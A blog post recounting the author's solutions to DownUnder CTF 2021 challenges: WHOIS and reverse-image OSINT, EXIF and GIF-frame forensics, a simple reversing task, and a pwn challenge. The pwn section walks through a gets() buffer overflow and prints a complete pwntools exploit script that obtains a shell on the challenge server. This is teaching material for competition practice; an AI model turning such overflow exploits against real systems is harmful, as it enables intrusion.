---
layout: default
title: DownUnder 2021
nav_order: 6
description: "Down Under 2021 CTF"
permalink: /ctfs/downunder21
has_children: false
parent: CTF List
last_modified_date: 29-09-2021 02:48 AM +0530
---

# Down Under CTF 2021
{: .no_toc}
Downunder CTF is one of the largest annual CTF shows and the biggest online CTF challenge from the Australian
continent. Also the backing and sponsorships showed up in the infrastructure and the smoothness with which the
online challenge was run.  
{: .fs-5 .fw-300 }

As always I would be highlighting the solves for challenges that I attempted and/or solved. Also I would be 
highlighting the solves for couple of **`pwn`** challenges which I tried and solved after the competition was
over.  
{: .fs-5 .fw-300 }

From the rules and the welcome challenge it was clear that the flags were always of the format **`DUCTF{...}`**.
However the introduction challenge was a bit different wherein we had to connect to a **`netcat`** server. After
a long message exchange the server gives out the introduction flag as part of the message. The introduction flag
is **`DUCTF{w3lc0m3_70_7h3_duc7f_7hund3rd0m3_h4ck3r}`**.  
{: .fs-5 .fw-300 }

Also the discord flag was available from the #request-support channel which was 
**`DUCTF{if_you_are_having_challenge_issues_come_here_pls}`**.  
{: .fs-5 .fw-300 }

## Challenge list
{: .no_toc .text-delta}

1. TOC
{:toc}

## Who goes there ? 🌏
OSINT  
{: .label .label-green .fs-1 .ml-0}

The first OSINT challenge and one of the easier challenges of Downunder CTF. The challenge instructions
were very comprehensive and was indicative of domain registrar information which is available via various
popular sites like [who.is][1].  

Challenge instructions:  
> Disclaimer: Please note that this storyline, including any previous or future additions are all fictional and 
> created solely for this challenge as part of DownUnder CTF. These are real places however they have no 
> association/affiliation to the event, you are not required to call any place or make contact with anyone, doing 
> so may disqualify you from the event.  
> 
> Welcome to the team, glad you chose to join us - hopefully you’ll like it here and want to stay.  
> Let me tell you about your first task:
> 
> We’ve observed an underground criminal RaaS operation calling back to this domain, can you find  
> the number of the individual who registered the domain?  
> **`646f776e756e646572.xyz`**
>
> Flag format is DUCTF{+61<number>}  

From the challenge instructions it is clear that the flag is the phone number of the individual who has
registered the given domain **`646f776e756e646572.xyz`**.  

Looking up the domain in **`who.is`** gives us the required information forming the flag **`DUCTF{+61420091337}`**.  

![Who is output][2]  


## Get over it 🌁
OSINT  
{: .label .label-green .fs-1 .ml-0}  

This was the second OSINT challenge with the below challenge instructions. It was pretty clear it would test
our dork and reverse search skills. Along with the below instructions we are provided an image file which
can be downloaded from [here][3].

Challenge instructions:  
> Bridget loves bridges, this one is her favourite.  
> What is the name of it and the length of its main span to the nearest metre?  
> Flag format; DUCTF{the_bridge_name-1337m}  

The image was that of a bridge and our goal was to find out the name of the image and its deck length. I started
off with a reverse image search on [Google][4]. I did not get any obvious results even after a lot of contextual 
search including terms like **Australia**, **Down under** etc..  

Next I moved on to [Yandex][5] reverse image search. The search did given me a list of similar images and clicking
on one of them gave me the below details.  

![Eleanor Schonell initial][6]  

Once the initial details was available and as this bridge seemed a likely candidate, I looked up more in 
[Wikipedia][7] for **Eleanor Schonell**.  

A quick read in Wikipedia gives us the total length as **390 meters** and the deck length as **185 meters**. Quickly
forming the flag as stated in the instructions, the final flag turned out to be **`DUCTF{eleanor_schonell-185m}`**.  


## Retro 🖼
Forensics  
{: .label .label-green .fs-1 .ml-0}  

The first challenge under the forensics category was obviously targeted towards beginners. The challenge was pretty
easy requiring us to figure out the flag from an image which can be donwnloaded [here][8].  

Challenge instructions:  
> Our original logo was created in paint, I wonder what other secrets it hides?


For most of the image based challenges the first thing to do is to run either **`exiftool`** command or **`strings`**
command identify if any meta data or strings of interest are present in the image. **Exiftool** can be run on any
image/file and it parses the available meta information and presents the same in the command line.  

Below is the output of both the commands. For brevity I have piped the result with **`grep -in 'ductf'`** as the string
of interest in out case starts with **DUCTF**.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/downunder/retro]
└─$ exiftool og.jpg | grep -in "ductf"
17:Artist                          : DUCTF{sicc_paint_skillz!}
18:XP Author                       : DUCTF{sicc_paint_skillz!}
54:Creator                         : DUCTF{sicc_paint_skillz!}
                                                                                                                                                                
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/downunder/retro]
└─$ strings og.jpg | grep -in "ductf"                
3:DUCTF{sicc_paint_skillz!}
260:			<dc:creator><rdf:Seq xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>DUCTF{sicc_paint_skillz!}</rdf:li></rdf:Seq>
```  

From the output it is very clear that our flag is **`DUCTF{sicc_paint_skillz!}`**.  


## How to pronounce GIF 🎞
Forensics  
{: .label .label-green .fs-1 .ml-0}  

The second challenge under forensics, also concentrated around image steganography, we are presented
with the below instructions and a GIF image which can be downloaded [here][9].  

Challenge instructions:  
> Our machine that makes QR Codes started playing up then it just said "PC LOAD LETTER" and died.  
> This is all we could recover...  

Similar to the previous challenge here too we are only provided with the below image and we run 
**`exiftool`** over it.  

![Challenge.gif][13]  

The result of running **`exiftool`** can be seen below:  
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/downunder/pronouncegif]
└─$ exiftool challenge.gif
ExifTool Version Number         : 12.16
File Name                       : challenge.gif
Directory                       : .
File Size                       : 104 KiB
File Modification Date/Time     : 2021:09:25 06:41:27+05:30
File Access Date/Time           : 2021:09:29 00:25:48+05:30
File Inode Change Date/Time     : 2021:09:25 06:42:36+05:30
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 300
Image Height                    : 22
Has Color Map                   : Yes
Color Resolution Depth          : 8
Bits Per Pixel                  : 8
Background Color                : 0
Animation Iterations            : Infinite
Comment                         : Created with ezgif.com GIF maker
Frame Count                     : 120
Duration                        : 6.00 s
Image Size                      : 300x22
Megapixels                      : 0.007
```  

Initially the output from this seemed immaterial to the challenge. It looked as if we needed to
reconstruct a single image by assembling the individual GIF frames. I set out to doing it using
GIMP tool. But I failed miserably.  

Then I re-iterated from the starting and the result of **`exiftool`** pointed towards a trivia
that this GIF was made using an online tool [ezgif.com][10]. Now this website seemed only my
last hope of re-assembling the frames to get back the image.  

More specifically the **Split > GIF to sprite** option in this site available [here][11] did exactly what
we wanted. I quickly uploaded the GIF and left the number of columns option to the default of **5**. This
gave me a smudged image of five QR codes which clearly pointed that there were more than five QR codes.  

![Smudged QR code images][12]  

Naturally I increased the number of columns to **10** next. This gave me ten clear QR codes as seen below.  


![Clear QR codes images][14]  

Now that we had the individual QR codes, the only thing left to do was to scan them. Most of them were decoy
QR codes. However specifically QR code 6  and QR code 8 gave me strings which look like Base64 encoded as 
seen below.  

```text
QR code 6 - RFVDVEZ7YU1 - 
QR code 8 - fMV9oYVhYMHJfbjB3P30=
```

Concatenating both the strings and Base64 decoding gives us the final flag **`DUCTF{aM_1_haXX0r_n0w?}`**.


## No strings 🧵
Reversing  
{: .label .label-green .fs-1 .ml-0}  

The first challenge in the **Reversing** category, this was supposed to be pretty easy. Also the challenge
name and the challenge instructions below point a lot towards applying the **`strings`** command to the
given binary which can be downloaded from [here][15].  

Challenge instructions:  
> This binary contains a free flag. No strings attached, seriously!

As everything pointed towards **`strings`** command I tried it out first and did not get any actionable string
from it.  

Next as done for any **`reversing`** challenge, I loaded the binary into [Ghidra][22]. On examining the disassembled
view the flag was available as continuous characters in a data frame, as seen below. To be more specific, the flag
was available from the starting address 0x00102008 with every second byte from there containing one character
of the flag.  

![Flag in data section][16]  

The final flag obtained by reading off all the characters from the data section was **`DUCTF{stringent_strings_string}`**.  


## Deadcode ♟️
Pwn  
{: .label .label-green .fs-1 .ml-0}  

The first PWN challenge in this edition and supposed to be one of the easiest in this category. However as I had no idea
on how to solve **Pwn** challenges I could not attempt it during the CTF. However, I came across a very good article
of one of the **Pwn** challenges of [CSAW21][17] which can be viewed [here][18].  

It was really informative and covered the essence of Pwning in a crisp manner giving me a starting point. To check if I
really understood the concepts I went ahead and tried to solve this challenge from the DownUnder CTF under PWN category.  

The first step was to enhance our **`gdb`** tool by installing the **`gdb-pwndbg`** plugin as explained [here][19].  

In the challenge we are presented with the below instructions and a binary file which can be downloaded [here][20].  

Challenge instructions:  
> I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.
> nc pwn-2021.duc.tf 31916

From the instructions it was clear that we have to achieve a shell in our local system to understand and formulate the
required payload post which the same exploit had to be applied on the remote server in order to gain a remote shell and
exfiltrate the flag.  

For any Pwn challenge the order of operations is generally the below:
1. Use **`checksec`** command to view the security enforcements applied on the binary.
2. Use **`strings`** command on the binary file to see if there are any strings of interest.
3. Use **`ltrace`** command to run the code and see if there is any thing obvious.
4. Load the binary in [**`Ghidra`**][22] to view the code.
5. Use **`gdb`** in order to narrow down to the payload and the offset required.

We start with checking the security controls on the binary. As seen below the binary is as unsafe as possible with almost
no security constraints.  
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/downunder/deadcode]
└─$ checksec --file ./deadcode    
[*] '/home/cryptonic/CTFs/downunder/deadcode/deadcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Apart from **NX => Non Executable** there is no other security constraints applied. As there is no [canary][21] it is easy
for us to perform a buffer overflow in case the same is needed.  

Next we run **`strings`** and **`ltrace`** commands to see if there are any obvious things that lead us to the flag but we
do not get any actionable detail.  

Proceeding further I loaded up the binary into [Ghidra][22]. A snapshot of the reconstructed C cdod can be viewed below.  

![C code deadcode][23]  

The below facts are clear from the code: 
1. We have two local variables **`local_28`** which is a **`char`** array and **`local_10`** which is a **`long`** value.
2. The variable **`local_28`** and **`local_10`** are defined immediately after each other.
3. The user input is obtained using **`gets`** function and stored in **`local_28`**.
4. If the value of **`local_10`** variable matched the hex value of **`0xdeadc0de`** then we are presented a shell.

As there is no user input associated with the variable **`local_10`** variable it is clear that we need to modify its value
by performing a buffer overflow attack.  

To give an introduction, buffer overflow attack exploits the know rule of a disassembler assigning local variables of a 
function addresses that are one after another. As [ASLR][24] is disabled (as seen from output of **`checksec`** command) we 
can be sure that the offsets and addresses we see here are exactly the same where the code will be loaded in the remote server
too. Atleast the relative addresses will necessarily remain the same.  

So our next step is to narrow down the required payload. For this specific challenge, it can be done really easily as the variables
are stored one after another in the stack. We can clearly see that after 24 bytes of genuine string payload, we need to follow it
with 4 bytes of value equal to **`0xdeadc0de`**. Although the above does give us a shell, I would present a more generic way
inspired from the video I highlighted at the start.  

We load up the binary in **`gdb`** (remember we already have **`gdb-pwndbg`** installed) and set breakpoints in the specific address
where the comparison happens. Next we use the pwndbg  **`cyclic`** command to generate a cyclic payload which makes it easy for us to
look up any four continuous bytes of data to know its offset.  

Now we run the code, supply the generated payload and we will land up at a segmentation fault error. At this point the current stack
and heap and other register details are printed in **`gdb`**. On closely analyzing the address which holds the variable **`local_10`**
at this state we can find out the value stored in it. The starting four bytes can be copied and used in the **`cyclick -l`** command
to look up the offset which points to  **`24`** again.  

A run of the above mentioned method to find the offset can be seen below.

![GDB PwnDBG find offset][25]  

To make it more clear, we set the breakpoint at **`0x4011dd`** which is the address of the comparison instruction. Also
from [Ghidra][22] we can see that **`local_10`** variable is at **`[RBP - 0x08]`** where RBP is the base pointer. In our
current execution this value is **`0x7fffffffddf8`** which means we need to look up the offset of the first four bytes of value
in the address **`0x7fffffffddb0 - 0x08 = 0x7fffffffdda8`**. The part of our cyclic payload that is present in this address
starts with **`gaaa`** and finding the offset of these four bytes within our cyclic payload gives 24 , which is the offset
at which the value starts overflowing into the variable **`local_10`**.  

Next we create our exploit file using the [**`pwn`**][26] tools library as shown in [this][27] template. We start with the 
template and modify, the binary path, offset and the actual value to be overflown to the variable. Our final exploit file
is given below.  

<details markdown="block">
  <summary>
  Click here to view the exploit file
  </summary>  

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './deadcode'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 24 # find_ip(cyclic(500))

# Start program
io = start()

# Build the payload
payload = flat([
    offset * "A",
    3735929054 # or can be used as 0xdeadc0de
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('my app?', payload)
#io.recvuntil('Thank you!\n')

# Got Shell?
io.interactive()

# Or, Get our flag!
# flag = io.recv()
# success(flag)
```
</details>  

Running this on the local machine from the directory where the binary exists we see that
we can get an interactive shell. Below is the run on the remote server.  

![Execution in remote][28]  

The final flag after pwning is obtained as **`DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`**.






[1]: https://who.is/
[2]: https://gcdn.pbrd.co/images/v2I4rF6aGxw7.gif?o=1
[3]: https://mega.nz/file/Y1YUVTaA#lwhD2FYdWZw9-ADrNQ3sBXMSzGSkbvojorx0IQ87Xnk
[4]: https://www.google.co.in/imghp?hl=en&ogbl
[5]: https://yandex.com/images/search
[6]: https://gcdn.pbrd.co/images/kyM55iYvN5uk.png?o=1
[7]: https://en.wikipedia.org/wiki/Eleanor_Schonell_Bridge
[8]: https://mega.nz/file/JogClAAK#nevnxdlEdVXU7EJEif3QecOMFC0fKvyieMcy3PlJsyw
[9]: https://mega.nz/file/o44yEQAS#xcMtxS6IPVd9GmsDvb2oCisR2_GB5ApTC_holSkNP4I
[10]: https://ezgif.com
[11]: https://ezgif.com/gif-to-sprite
[12]: https://gcdn.pbrd.co/images/plMQypd6V0fb.png?o=1
[13]: https://gcdn.pbrd.co/images/I0CZyQrGM00N.gif?o=1
[14]: https://gcdn.pbrd.co/images/MmqgOEruHIn1.png?o=1
[15]: https://mega.nz/file/csImjLhZ#JdxIVtwnAXhpjnFy4I2-S0cmKozHaaRs2VIdsCuwtgQ
[16]: https://gcdn.pbrd.co/images/XZ5IdkcD4GEd.png?o=1
[17]: csaw21
[18]: https://www.youtube.com/watch?v=1Dw21NoxXjE&t=315s
[19]: https://github.com/pwndbg/pwndbg#how
[20]: https://mega.nz/file/psR0TJKR#WYkRowgwaLMps0V-1S4dnpZ2Du9rJjXowSZVcZihEnM
[21]: https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries
[22]: ../ctftools/ghidra
[23]: https://gcdn.pbrd.co/images/EsfGhjbW0gLL.png?o=1
[24]: https://en.wikipedia.org/wiki/Address_space_layout_randomization
[25]: https://gcdn.pbrd.co/images/lY8WbNYEDpZk.gif?o=1
[26]: https://docs.pwntools.com/en/stable/
[27]: https://github.com/Crypto-Cat/CTF/blob/main/pwn/official_template.py
[28]: https://gcdn.pbrd.co/images/A8X82VCyDAvf.gif?o=1